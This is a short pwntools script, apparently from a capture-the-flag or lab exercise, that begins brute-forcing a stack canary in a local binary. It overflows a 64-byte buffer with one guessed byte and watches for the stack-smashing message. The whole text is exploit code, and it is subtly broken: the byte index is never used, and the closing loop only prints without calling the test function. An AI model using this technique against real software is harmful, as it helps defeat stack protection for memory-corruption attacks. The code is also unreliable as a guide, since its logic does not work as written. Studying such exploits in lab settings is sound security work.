from pwn import *
context.log_level = 'error'

def test_canary(i, c):
    p = process('./binary')
    p.recvuntil(b'> ')
    p.sendline(b'64')
    p.recvuntil(b'Input> ')
    p.send(b'A'*64 + bytes([c]))
    output = p.recvall()
    p.close()
    return b'Smashing' not in output

for i in range(4):
    print(f"Testing byte {i}")
